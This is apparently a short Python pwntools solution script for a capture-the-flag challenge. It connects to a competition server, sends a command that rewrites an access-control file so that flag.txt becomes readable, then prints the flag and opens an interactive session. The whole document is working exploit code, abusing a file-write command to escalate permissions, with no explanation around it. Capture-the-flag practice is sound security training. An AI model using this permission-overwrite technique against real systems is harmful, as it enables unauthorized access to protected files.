from pwn import *

p = remote('challenges.auctf.com',30010)

print p.recvrepeat(0.2)


p.sendline('write flag.txt:user:600 acl.txt')

print p.recvrepeat(0.2)

p.sendline('cat flag.txt')

p.interactive()
